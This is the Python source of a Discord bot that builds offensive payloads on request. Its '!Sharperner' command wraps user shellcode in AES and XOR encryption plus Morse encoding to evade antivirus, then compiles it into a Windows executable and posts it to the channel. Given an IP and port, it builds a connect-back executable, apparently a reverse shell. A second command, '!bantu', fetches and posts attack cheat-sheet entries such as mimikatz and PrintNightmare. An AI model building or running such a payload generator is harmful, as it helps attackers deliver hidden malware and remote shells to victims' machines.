#!/usr/bin/env python3
import discord
import os
import subprocess
from discord.ext.commands import Bot
from dotenv import load_dotenv
import re
import random
import base64
import binascii
import itertools
import string
import requests
from Crypto.Cipher import AES
from Crypto import Random
from itertools import islice

CSPROJ_ROOT = f"{os.getcwd()}/template"
PROJ_MAIN = f"{CSPROJ_ROOT}/Program.cs"
PROJ_PATH = f"{CSPROJ_ROOT}/Program.csproj"
TEMPLATE_PATH = f"{os.getcwd()}/templates"
PROJ_OUTPUT = f"{CSPROJ_ROOT}/bin/Debug/net45/Program.exe"
COMPILER = "~/dotnet/dotnet"

MORSE_CODE_DICT = {'a':'.-','A':'^.-','b':'-...','B':'^-...','c':'-.-.','C':'^-.-.','d':'-..','D':'^-..','e':'.','E':'^.','f':'..-.','F':'^..-.','g':'--.','G':'^--.','h':'....','H':'^....','i':'..','I':'^..','j':'.---','J':'^.---','k':'-.-','K':'^-.-','l':'.-..','L':'^.-..','m':'--','M':'^--','n':'-.','N':'^-.','o':'---','O':'^---','p':'.--.','P':'^.--.','q':'--.-','Q':'^--.-','r':'.-.','R':'^.-.','s':'...','S':'^...','t':'-','T':'^-','u':'..-','U':'^..-','v':'...-','V':'^...-','w':'.--','W':'^.--','x':'-..-','X':'^-..-','y':'-.--','Y':'^-.--','z':'--..','Z':'^--..','0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.','/':'/','=':'...^-','+':'^.^','!':'^..^'}

load_dotenv()
TOKEN = os.getenv("TOKEN")
client = discord.Client()

def _generateShellcodeTemplateFile(template_path,morsed_xor_key,morsed_b64aes_key, morsed_b64aes_iv, morsed_shellcode):
    template = open(template_path).read()
    updated = template.replace("REPLACE SHELLCODE HERE", morsed_shellcode).replace("REPLACE XORKEY", morsed_xor_key).replace("REPLACE A3S_KEY", morsed_b64aes_key).replace("REPLACE A3S_IV", morsed_b64aes_iv)
    return updated

def _generateTemplateFile(template_path,ip_address, port):
    template = open(template_path).read()
    updated = template.replace("REPLACEIP",ip_address).replace("REPLACEPORT",port)
    return updated

def banner(shellcode=None, cheatsheet=None):
    if shellcode:
        help = """```
Usage:  !Sharperner 10.10.10.10 4004
        !Sharperner <paste-b64-here>
```"""
    elif cheatsheet:
        help = """```
Usage:  !bantu print nightmare
        !bantu mimikatz
```"""
    return help

def parse_cmd(cmd):
    return cmd.split(" ")

def iscompiled():
    outfile_pattern = r"(\/.*[^\/]?\.exe)"
    cmd = f"{COMPILER} build {PROJ_PATH}"
    result = subprocess.run(cmd.split(" "), stdout=subprocess.PIPE)
    cmd_output = result.stdout.decode('utf-8')

    if "Build succeeded" in cmd_output:
        output_filepath = re.findall(outfile_pattern, cmd_output)[0].strip()
        PROJ_OUTPUT = output_filepath
        return True
    else:
        return False

def IsValidNumber(port):
    return port.isnumeric()

def IsValidIp(ip):
    regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
    if(re.search(regex, ip)):
        return True
    else:
        return False

def isBase64(s):
    try:
        base64.b64decode(s)
        return True
    except binascii.Error:
        return False

def get_crypto_data():
    """
    Uses pbkdf2 to build a KEY and IV pair.
    """
    random = Random.new()
    key = random.read(AES.key_size[0])
    iv = random.read(AES.block_size)
    return (key, iv)

def aes_pad(data: bytes) -> bytes:
    """
    Pad the data to make sure we are %16 == 0
    """
    bs = AES.block_size
    while len(data) % bs != 0:
        data += b"\x90"

    return data

def AESEncrypt(shellcode, key, iv):
    rijn = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = rijn.encrypt(shellcode)
    return ciphertext

def xor_encdec(shellcode, key):
    theKey = bytes(key, 'utf-8')
    encoded = []
    for i in range(0, len(shellcode)):
        encoded.append(shellcode[i] ^ theKey[i % len(theKey)])
    
    return bytes(encoded)

def morse_code_translate(shellcode):
    cipher = ''
    for letter in shellcode:
        if letter in MORSE_CODE_DICT.keys():
            cipher += MORSE_CODE_DICT[letter] + ' '
        else:
            cipher += letter + ' '
    return cipher

def gen_random_key(l):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=l))

async def generate_shellcode_payload(message, blob):
    if isBase64(blob):
        await send_text(message, "Embeding your shellcode. Hope it works idk??\_(???)_/??")
        raw_payload = aes_pad(base64.b64decode(blob))
        
        # aes encrypt
        #aes_key = base64.b64decode("AXe8YwuIn1zxt3FPWTZFlAa14EHdPAdN9FaZ9RQWihc=") #temp
        #aes_iv = base64.b64decode("bsxnWolsAyO7kCfWuyrnqg==") #temp
        aes_key = os.urandom(32)
        aes_iv = os.urandom(16)
        aes_shellcode = AESEncrypt(raw_payload, aes_key, aes_iv)
        
        # xor with random key
        #xor_key = "Sup3Rs3cur5k3y!"
        xor_key = gen_random_key(16)
        xoraes_shellcode = xor_encdec(aes_shellcode,xor_key)
        b64xoraes_shellcode = base64.b64encode(xoraes_shellcode).decode('utf-8')
        
        # translate to morse code
        b64aes_key = base64.b64encode(aes_key).decode('utf-8')
        b64aes_iv = base64.b64encode(aes_iv).decode('utf-8')

        morsed_xor_key = morse_code_translate(xor_key)
        morsed_b64aes_key = morse_code_translate(b64aes_key)
        morsed_b64aes_iv = morse_code_translate(b64aes_iv)
        morsed_shellcode = morse_code_translate(b64xoraes_shellcode)
        
        template_path = f"{TEMPLATE_PATH}/shellcode_template.cs"
        template = _generateShellcodeTemplateFile(template_path, morsed_xor_key,morsed_b64aes_key, morsed_b64aes_iv, morsed_shellcode)
        f = open(PROJ_MAIN,"w").write(template)

    else:
        await send_text(message, "Dude! this is not a base64 string")
        await send_text(message, banner())

async def generate_payload(message, ip_address, port):
    await send_text(message, "Generating. Hope it works idk??\_(???)_/??")
    template_path = f"{TEMPLATE_PATH}/template.cs"
    template = _generateTemplateFile(template_path, ip_address, port)
    
    f = open(PROJ_MAIN,"w").write(template)

def query_list(data, keyword):
    found = False
    for line in data:
        if all(word in line.lower() for word in keyword):
            found = True
    return found

def search(content, keyword):
    result = []
    temp_list = []
    for line in content:
        line = line.strip()

        ### temp_list.append(line)

        ###if len(line.strip() == 0) and len(temp_list)>1:
        if line.startswith("#") or (line.strip().startswith("[") and line.strip().endswith("]")) and len(temp_list)>1:
            # search lah
            if query_list(temp_list, keyword):
                temp_list = [i for i in temp_list if i]
                result.append(list(temp_list))

            # clearkan temp_list
            temp_list.clear()
    
        temp_list.append(line)
    temp_list.clear()
    return result

def _fetchOnline(urls):
    content = ""
    for url in urls:
        content += requests.get(url).text.replace("```bash","").replace("```code","").replace("```","")
        content += '\n'

    return content.split('\n')

def get_from_other(query):
    url = "https://gist.github.com/w00tc/486825a0b7c593789b1952878dd86ff5"                                                                                                                                                                     
    res = requests.get(url)                                                                                                                                                                                                                    
    results = re.findall(f"js-file-line\">(.*{query}.*)<\/td>", res.text)                                                                                                                                                                       
    return results

@client.event
async def on_ready():
    print(f"We have logged in as {client.user}")

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!bantu'):
        cmd = parse_cmd(message.content)

        if(not len(cmd) <= 1):
            urls =   [
                        "https://raw.githubusercontent.com/aniqfakhrul/archives/master/arsenals",
                        "https://raw.githubusercontent.com/H0j3n/EzpzCheatSheet/main/README.md",
                        "https://raw.githubusercontent.com/m0chan/m0chan.github.io/master/_posts/2018-07-31-Linux-Notes-And-Cheatsheet.md"
                        ]
            _filecontent = _fetchOnline(urls)
            #keyword = ' '.join(cmd[1:])
            keyword = [word.lower() for word in cmd[1:]]
            results = search(_filecontent, keyword)
            output = ""
            if results:
                for result in results:
                    output += '\n'.join(result)
                    output += '\n\n'

                if len(output) <= 1950 :
                    await send_text(message , f"```{output}```")
                else:
                    # Limit check
                    limits = 0
                    for result in results:
                        if limits < 5:
                            # Implement Checkers and Unique List
                            check = len('\n'.join(result))
                            if check <= 1950:
                                output = '\n'.join(result)
                                await send_text(message , f"```{output}```")
                            else:
                                listUniq = []
                                first_half = result[:len(result)//2]
                                output = '\n'.join(first_half)
                                await send_text(message , f"```{output}```")
                                second_half = result[len(result)//2:]
                                output = '\n'.join(second_half)
                                await send_text(message , f"```{output}```")
#                                print(result)
#                                output = '\n'.join(result)
#                                await send_text(message , f"```{output}```")
                            limits += 1
                        else:
                            break
                    # Original
                    #for result in results:
                    #    output = '\n'.join(result)
                    #    await send_text(message, f"```{output}```")
                    #f = open("/tmp/result.txt","w").write(output)
                    #with open("/tmp/result.txt","rb").read() as file:
                    #    await message.channel.send(file=discord.File(file, "result.txt"))
                    #os.remove("/tmp/result.txt")
            else:
                await send_text(message, f"Cant find any. Searching from other links...")
                query = cmd[1]
                results = get_from_other(query)
                output = "\n".join(results).replace("&amp;","&").replace("&quot;",'"').replace("&apos;","'").replace("&gt;",">").replace("&lt;","<")
                if output:
                    await send_text(message, f"```{output}```")
                else:
                    await send_text(message, "Nope nothing :(")


            results.clear()
        else:
            await send_text(message, banner(cheatsheet=True))

    if message.content.startswith('!comel'):
        await send_text(message, f"https://cataas.com/cat/says/hi%20{message.author}")

    if message.content.startswith('!Sharperner'):
        cmd = parse_cmd(message.content)
        if(len(cmd) == 2):
            blob = cmd[1]
            await generate_shellcode_payload(message, blob) 
            if iscompiled():
                await send_file(message,PROJ_OUTPUT)
            else:
                await send_text(message, "Sorry dude! something is wrong. Failed to compile")

        elif(len(cmd) == 3):
            if(not IsValidIp(cmd[1])):
                await send_text(message, "Nope! not a valid IP. Dont trick me :))")
                await send_text(message, banner(shellcode=True))
                return
            elif(not IsValidNumber(cmd[2])):
                await send_text(message, "herm... invalid port ??\_(???)_/??")
                await send_text(message, banner(shellcode=True))
                return
            else:
                ip_address = cmd[1]
                port = cmd[2]
                
                await generate_payload(message, ip_address, port)
                if iscompiled():
                    await send_file(message,PROJ_OUTPUT)
                else:
                    await send_text(message, "Sorry dude! something is wrong. Failed to compile")

        else:
            await say_hello(message)
            await send_text(message, banner(shellcode=True))

async def say_hello(message):
    hellos = ["Hello dude!", "Yes?", "How can i help you?", "Hola amigos", "Howdy?" ,"Howdy partner"]
    await message.channel.send(random.choice(hellos))

async def send_text(message,text):
    await message.channel.send(text)

async def send_file(message,filepath):
    await message.channel.send(file=discord.File(filepath))

client.run(TOKEN)
